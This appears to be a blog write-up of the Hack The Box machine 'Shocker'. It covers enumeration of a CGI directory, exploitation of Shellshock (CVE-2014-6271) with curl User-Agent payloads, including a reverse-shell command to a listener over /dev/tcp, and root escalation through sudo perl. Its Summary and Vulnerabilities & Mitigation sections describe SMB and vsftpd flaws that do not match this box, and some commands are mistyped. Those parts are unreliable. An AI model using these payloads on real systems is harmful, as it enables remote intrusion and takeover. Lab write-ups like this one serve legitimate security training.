--- 
title: "Hack the Box (HTB) - Shocker"
description: "Exploiting Shellshock"
date: 2024-07-20 12:00:00 -100
image: /assets/images/HTB - Shocker/HTB - Shocker Thumbnail.png
categories: [CTF]
tags: [shellshock,web application]    # TAG names should always be lowercase
---

## Enumeration

Let's start by running a [AutoRecon]([asdf](https://github.com/Tib3rius/AutoRecon)) against our box at `10.10.10.56`

```bash
sudo autorecon 10.10.10.56
```

Check out full TCP scan of the machine, we see the following ports open:

| Port     | State | Service | Reason           | Version                                |
|----------|-------|---------|------------------|----------------------------------------|
| 80/tcp   | open  | http    | syn-ack ttl 63   | Apache httpd 2.4.18 ((Ubuntu))        |
| 2222/tcp | open  | ssh     | syn-ack ttl 63   | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2        |

SSH is on a non standard port, but is irrelevant. Let's check out the apache web server running on port 80

![Apache web server](/assets/images/HTB%20-%20Shocker/Apache%20web%20server.png)

Nothing much here, checking  the source code only reveals bug.jpg which isn't useful

Let's check out dirbuster scan provided to us by autorecon

![Dirbuster](/assets/images/HTB%20-%20Shocker/Shocker%20Dirbuster.png)

Only 200 response on the root directory and bug.jpg.

I decided  to run a `feroxbuster` scan manually to check the directories as well

![CGI-BIN](/assets/images/HTB%20-%20Shocker/CGI%20BIN.png)

We're getting a 403 access denied on cgi-bin/ which is a common directory for web severs to store CGI executable scripts. These scripts are used to generated dynamic content on web servers. Let's run another enumeration on `cgi-bin/` to see what scripts we can find

```bash
feroxbuster -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x cgi,sh,pl,py,php
```

![User.sh Script](/assets/images/HTB%20-%20Shocker/user.sh.png)

We get a 200 response on this /user.sh script. Let's curl the request to see what we get

```bash
curl http://10.10.10.56/cgi-bin/user.sh
```

![Curl Request](/assets/images/HTB%20-%20Shocker/Curl%20Request.png)

I got stuck here, and apparently this directory is vulnerable to an exploit called [Shellshock](https://beaglesecurity.com/blog/vulnerability/shellshock-bash-bug.html#:~:text=Shellshock%2C%20also%20known%20as%20the,to%20a%20Bash%2Dbased%20application.). It's a vulnerability in old versions of Bash that lets attackers send HTTP requests that manipulate variables due to improper handling of environment variable function definitions

We can run a specific nmap scan against this to test if the target is vulnerable

```bash
nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56
```
![Shocker Nmap](/assets/images/HTB%20-%20Shocker/Shocker%20nmap.png)

Our nmap scans confirms the target is vulernable to [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/cve-2014-6271) I.E Shellshock

## Exploiting without Metasploit

There's a metasploit module that gets us user level access with the click of a button, but let's try exploiting manually first

We will use the following curl to make a malicious HTTP request with a specially crafted User-Agent header

```bash
url -H "User-Agent: () { :;}; echo; /bin/bash -c 'whoami'"
```

- `() { :;}:` Defines a function in the User-Agent header
- `/bin/bash -c 'id'` Part of the command that is executed by the vulnerable bash interpreter

Since this sever is confirmed to be running an outdated version of bash, it will process our user-agent header as a function definition. This happens because bash **before the shellshock update** processes the user agent header as a function definition instead of plain

![Shell Shocked](/assets/images/HTB%20-%20Shocker/Shell%20Shocked.png)

We have RCE. Let's get our shell going. I'll start up my nc listener and perform the following curl request

```bash
curl -H "User-Agent: () { :;}; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.36/9001 0>&1'" http://10.10.10.56/cgi-bin/user.sh
```

![Shell](/assets/images/HTB%20-%20Shocker/Shell.png)


## Privilege Escalation

Running `sudo -l` tells us the following:

- User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

We can run perl commands as root without a password. We can leverage this to execute /bin/sh to spawn a shell. Since we run this as sudo it will spawn a root shell

```bash
sudo /usr/bin/perl -e 'exec "/bin/sh"'` 
```

GG, we've rooted Shocker!

![Rooted](/assets/images/HTB%20-%20Shocker/Root%20Shocker.png)




## Summary

1. Initial enumeration discovered Web server
2. Directory busting web server discoverd CGI
3. Gained root though SMB exploit running as root

## Vulnerabilities & Mitigation

| Vulnerability     | Mitigation            |
|-------------------|-----------------------|
| Anonymous FTP login allowed  | Disable anonymous FTP login |
|Outdated FTP version (vsftpd 2.3.4)|Update to the latest version of vsftpd|
|  Vulnerable SMB version (3.0.20-3.0.25rc3) | Update Samba to the latest version to patch the vulnerability

### Remediation References

- [Disable FTP Anonymous Login](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/sites/site/ftpserver/security/authentication/anonymousauthentication)
- [NIST SP 800-53](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf)